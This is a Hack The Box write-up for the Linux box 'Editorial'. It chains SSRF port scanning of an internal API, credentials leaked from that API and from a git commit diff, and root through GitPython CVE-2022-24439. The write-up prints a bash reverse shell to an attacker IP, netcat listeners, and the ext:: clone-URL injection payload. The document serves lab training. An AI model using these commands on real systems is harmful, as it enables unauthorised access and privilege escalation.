---
title: "Editorial — SSRF to an Internal API, a Git History, and a Vulnerable Library"
date: 2026-09-08
draft: false
tier: offensive-deep
summary: "An upload form that fetches URLs gives us a port scan of localhost, a forgotten API on 5000 hands over credentials, a commit diff gives up the production password, and a library the sudo script imports finishes it."
categories:
  - Offensive
tags:
  - Editorial
  - Hack The Box
  - Linux
  - Web
  - SSRF
  - Python
  - Git
ShowToc: true
TocOpen: false
---

## Overview

**Box:** Editorial (Hack The Box) · **OS:** Linux

The chain here is simple, and it was fun to learn. A publishing site has an upload form that will fetch a cover image from a URL you give it, which is server-side request forgery with a friendly interface. Pointing it at localhost and probing the ports over HTTP turns up a service on 5000 that answers with API documentation, and one of those endpoints hands over a set of credentials.

That gets us onto the box. From there a git repository in the user's home has a commit that downgraded the environment from production to development, and the production password is sitting in the diff. That user can run a Python script with `sudo`, and although we cannot modify it, we can supply a URL that exploits its GitPython call.

Not too hard, not too easy. I came out of it having learned some git commands, an argument injection through a clone URL, and a better feel for what SSRF is actually good for.

## Recon

Ports 22 and 80 are open. Add `editorial.htb` to `/etc/hosts` and go look at the site. Nothing on 22 is free, so everything starts on 80.

Exploring the page functionality, there is an upload field. We do not know what the site is running and there is not much else to discover here, but the field takes a URL as well as a file. Let's test out some SSRF.

## Foothold

### Confirming the request is really ours to steer

For a browser replay, use the **Preview** button on `/upload` to trigger the cover fetch. This detail is corroborated by [Bloodstiller's walkthrough](https://bloodstiller.com/walkthroughs/editorial-box/#enumerating-the-publish-with-us-page-for-injection-points).

In Burp, the URL lands at `/upload-cover`, carried in the `bookurl` field of the multipart body. That is the field to mark up later. Sending `http://127.0.0.1` there comes back `200 OK`, but that does not tell us whether the fetch succeeded or the address was filtered.

Let's make it talk to us instead:

```bash
nc -lvnp 4444
```

Point the cover URL at our own box on that port and we get a hit. The request arrives with a `User-Agent` of `python-requests`, so I am assuming the backend is running a Python framework. Might matter later.

### Walking the ports from the inside

Now that the server will fetch what we ask for, it can enumerate its own localhost for us.

This tests HTTP responses across ports. An open service speaking another protocol can still produce the failure image, so it is not a complete inventory of listening services. [0xdf's HTTP probe analysis](https://0xdf.gitlab.io/2024/10/19/htb-editorial.html#identify-internal-port).

```bash
seq 1 65535 > ports.txt
```

Send the upload request to Intruder, put the payload marker on the port in `bookurl`, and load that list.

The probes keep coming back `200` with the default image result, so the status code is not separating them. Grep the responses for that default instead, and look for one that does not match.

Port 5000 is the one that comes back different:

```text
static/uploads/671fb455-fbb8-4d16-aa89-332b5ee00c9c
```

The upload paths below are from my session, and each submission generates a fresh one. Use the path your own request returns when following along.

### Getting at what 5000 actually returned

This is where it needs a bit of creativity. What the form does with a URL is fetch it and use the result as the cover image, so the response body is sitting in that uploaded file rather than anywhere we can read directly. The usual result is the placeholder JPEG. For 5000 it is something else, and opening it in a new tab prompts a download rather than rendering.

That file is served back off the site at the path the response handed us, so pull it with `curl` rather than hunting for wherever the browser dropped it. It is JSON:

```bash
curl http://editorial.htb/static/uploads/671fb455-fbb8-4d16-aa89-332b5ee00c9c -o internal-api.json
jq . internal-api.json
```

Inside is a list of API endpoints on the internal service. The entries included authors, changelog, and how-to-use-platform.

So we go back to the same SSRF and request each of those in turn. Each one is two actions: put the endpoint URL in `bookurl` and submit it, then read the new path that submission returns.

```text
http://127.0.0.1:5000/api/latest/metadata/messages/authors
```

```bash
curl http://editorial.htb/static/uploads/ca85d32f-ac3f-41fe-a1b5-574bc2e46925 | jq
```

That is the stored response from the authors endpoint, and it carries credentials:

```text
Username: dev
Password: dev080217_devAPI!@
```

```bash
ssh dev@editorial.htb
```

That is the shell, and the user flag.

## Privilege escalation

### A git repository someone forgot about

There is an `apps` folder sitting in dev's home directory.

```bash
ls -la apps
```

It is a git repository. The files on disk are only the current state, and the history is where the rest of it lives.

```bash
cd /home/dev/apps
git status
```

A pile of deleted and uncommitted files. Then the history:

```bash
git log
```

Among the commits is one about downgrading the environment from production to development. Let's inspect that one.

Replace `COMMIT_HASH` with the hash of that entry from `git log`:

```bash
git show COMMIT_HASH
```

The diff gives up a second account:

```text
prod:080217_Producti0n_2023!@
```

`su prod` with that, and start again.

### Checking prod's permissions

My notes say "find nothing" after the SUID and SGID searches, but the saved commands use `2&>/dev/null`, which hides both output streams. The commands below correct that redirection; the original output is not preserved, so the scan result is uncertain.

```bash
find / -perm -2000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
```

The next recorded check was what prod could run with sudo:

```bash
sudo -l
```

Prod could run `/usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py` with our URL as its argument.

### It gets a little murky

We could read the script but could not modify it. I did not retain its full source; this is the import preserved in the notes:

```python
from git import Repo
```

`from git import Repo` points us to GitPython. We do not need to modify that library; the input we control is the URL supplied to the script.

```bash
pip freeze
```

The version recorded was GitPython 3.1.29, affected by CVE-2022-24439. The library passes the supplied clone URL to Git, where an `ext::` URL can invoke an external helper command. The subsequent GitPython release added protections against unsafe protocols and options. [GitPython 3.1.30 release](https://github.com/gitpython-developers/GitPython/releases/tag/3.1.30).

My notes do not preserve the cloning call. Checking the source captured in [0xdf's write-up](https://0xdf.gitlab.io/2024/10/19/htb-editorial.html#clone_changes) and [Bloodstiller's walkthrough](https://bloodstiller.com/walkthroughs/editorial-box/#enumerating-as-prod) during preparation confirms the relevant line:

```python
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

That option enables Git's `ext` transport for the clone. Git normally disables it; the script explicitly permits it while passing our URL through GitPython. This fills in the configuration detail missing from my capture. [Git protocol configuration](https://git-scm.com/docs/git-config#Documentation/git-config.txt-protocolallow).

The following uses the listener address recorded in my notes; replace `10.10.14.153` with your VPN address when replaying it. Write the payload somewhere the script's user can reach:

```bash
echo "bash -i >& /dev/tcp/10.10.14.153/4444 0>&1" > /tmp/shell.sh
```

In a separate terminal on the attacking machine, start the listener:

```bash
nc -lvnp 4444
```

Back in the prod session, pass the payload as the clone URL:

```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% /tmp/shell.sh'
```

The `%` is doing real work. Git splits an `ext::` command on spaces to build its argument list, and percent-space is the documented escape for a literal one, so `bash% /tmp/shell.sh` arrives at `sh -c` as a single argument instead of two. [Git remote-ext documentation](https://git-scm.com/docs/git-remote-ext). The shell comes back as root, and that ties it up with a neat bow.

## What didn't work

- **Treating the SSRF status code as the signal.** The default image result also came back with `200`, which made status alone unhelpful. The result only separated once the filter keyed on the response body rather than the status.
- **The rest of the API endpoints.** Changelog, how-to-use-platform, and the others were exactly what they said they were. The authors endpoint was the one that returned useful credentials.
- **SUID and SGID sweeps as prod.** The notes record no finding, but the saved redirection hides output. That leaves this check inconclusive.

## Takeaways

The thing I want to keep from the web half is to check what a failed fetch looks like before trusting the scan. Here, `200` did not distinguish the default image result from something useful. Changing the filter to look at the response body surfaced port 5000.

The git commands were useful to learn here. `git log` pointed us to the production-to-development change, and `git show` exposed the old credentials. Looking only at the current files would have missed that diff.

The version check identified the vulnerable GitPython release. The URL argument was how we reached it through the sudo script, and the explicit `ext` setting explains why Git accepted the payload. Reading the script and checking the library were both useful parts of this step.
